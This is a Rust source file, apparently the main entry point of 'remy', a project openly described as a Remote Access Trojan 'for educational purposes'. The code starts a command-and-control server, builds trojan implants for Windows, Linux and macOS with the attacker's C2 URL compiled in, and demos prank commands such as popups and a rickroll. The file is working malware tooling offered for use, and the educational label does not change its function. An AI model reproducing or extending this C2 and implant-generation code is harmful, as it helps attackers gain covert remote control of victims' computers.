/*
// Author: Aliasgar Khimani (NovusEdge)
// Project: github.com/ARaChn3/remy
//
// Copyright: MIT License
// See the LICENSE file for more info.
*/

//! remy - A Remote Access Trojan for educational purposes.
//!
//! This is the C2 server component. For the implant, see
//! src/implant/bin.rs.
//!
//! # Usage
//!
//! Start the C2 server:
//! ```bash
//! remy server --bind 0.0.0.0:8080
//! ```
//!
//! Generate an implant:
//! ```bash
//! remy generate --os windows --c2 http://your-server:8080
//! ```

mod commands;
mod crypto;
mod server;
mod shared;

use clap::{Parser, Subcommand};
use std::net::SocketAddr;
use tracing::Level;
use tracing_subscriber::FmtSubscriber;

use server::{ServerConfig, SessionManager};

/// remy - Remote Access Trojan (Educational)
#[derive(Parser)]
#[command(name = "remy")]
#[command(author = "Aliasgar Khimani <mr.nerd.study@gmail.com>")]
#[command(version = "0.1.0")]
#[command(about = "A simple RAT for educational purposes", long_about = None)]
struct Cli {
    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand)]
enum Commands {
    /// Start the C2 server
    Server {
        /// Address to bind to
        #[arg(short, long, default_value = "0.0.0.0:8080")]
        bind: SocketAddr,

        /// Serve the web UI
        #[arg(long, default_value = "true")]
        ui: bool,

        /// Default sleep interval for implants (seconds)
        #[arg(long, default_value = "30")]
        sleep: u64,
    },

    /// Generate an implant payload
    Generate {
        /// Target operating system
        #[arg(long, default_value = "linux")]
        os: String,

        /// C2 server URL
        #[arg(long)]
        c2: String,

        /// Output file path
        #[arg(short, long)]
        output: Option<String>,

        /// Sleep interval between check-ins (seconds)
        #[arg(long, default_value = "30")]
        sleep: u64,
    },

    /// Show a demo of troll commands (safe to run)
    Demo {
        /// Which troll command to demo
        #[arg(value_parser = ["rickroll", "speak", "popup"])]
        command: String,
    },
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Set up logging
    let subscriber = FmtSubscriber::builder()
        .with_max_level(Level::INFO)
        .finish();
    tracing::subscriber::set_global_default(subscriber)?;

    let cli = Cli::parse();

    match cli.command {
        Commands::Server { bind, ui, sleep } => {
            let config = ServerConfig {
                bind_addr: bind,
                serve_ui: ui,
                sleep_interval: sleep,
            };

            let sessions = SessionManager::shared();
            server::start_server(config, sessions).await?;
        }

        Commands::Generate { os, c2, output, sleep } => {
            use std::process::Command;

            println!("Generating implant for {}...", os);
            println!("C2 server: {}", c2);
            println!("Sleep interval: {}s", sleep);

            let (target, binary_name) = match os.as_str() {
                "windows" => ("x86_64-pc-windows-gnu", "remy-implant.exe"),
                "linux" => ("x86_64-unknown-linux-gnu", "remy-implant"),
                "macos" => ("x86_64-apple-darwin", "remy-implant"),
                _ => {
                    eprintln!("Unsupported OS: {}. Use: windows, linux, macos", os);
                    std::process::exit(1);
                }
            };

            let output_path = output.unwrap_or_else(|| binary_name.to_string());

            // Set C2 URL via environment variable (implant reads at compile time)
            println!("Building with REMY_C2_URL={}", c2);
            println!();

            let status = Command::new("cargo")
                .args(["build", "--release", "--bin", "remy-implant", "--target", target])
                .env("REMY_C2_URL", &c2)
                .status();

            match status {
                Ok(s) if s.success() => {
                    // Copy to output path
                    let built_path = format!("target/{}/release/{}", target, binary_name);
                    if let Err(e) = std::fs::copy(&built_path, &output_path) {
                        eprintln!("Failed to copy {} to {}: {}", built_path, output_path, e);
                        eprintln!("Binary is at: {}", built_path);
                    } else {
                        println!("Implant generated: {}", output_path);
                        println!("Size: {} bytes", std::fs::metadata(&output_path).map(|m| m.len()).unwrap_or(0));
                    }
                }
                Ok(_) => {
                    eprintln!("Build failed. Make sure you have the {} target installed:", target);
                    eprintln!("  rustup target add {}", target);
                    if os == "windows" {
                        eprintln!("  # Also install mingw-w64 for Windows cross-compilation");
                    }
                }
                Err(e) => {
                    eprintln!("Failed to run cargo: {}", e);
                }
            }
        }

        Commands::Demo { command } => {
            println!("Running demo: {}", command);
            println!();

            match command.as_str() {
                "rickroll" => {
                    println!("Opening rickroll in browser...");
                    match commands::troll::rickroll() {
                        Ok(msg) => println!("{}", msg),
                        Err(e) => println!("Error: {}", e),
                    }
                }
                "speak" => {
                    println!("Speaking a message...");
                    match commands::troll::speak("Hello, I am remy the rat!") {
                        Ok(msg) => println!("{}", msg),
                        Err(e) => println!("Error: {}", e),
                    }
                }
                "popup" => {
                    println!("Showing popup (just 1 for demo)...");
                    match commands::troll::popup("You've been remy'd!", 1) {
                        Ok(msg) => println!("{}", msg),
                        Err(e) => println!("Error: {}", e),
                    }
                }
                _ => println!("Unknown command"),
            }
        }
    }

    Ok(())
}
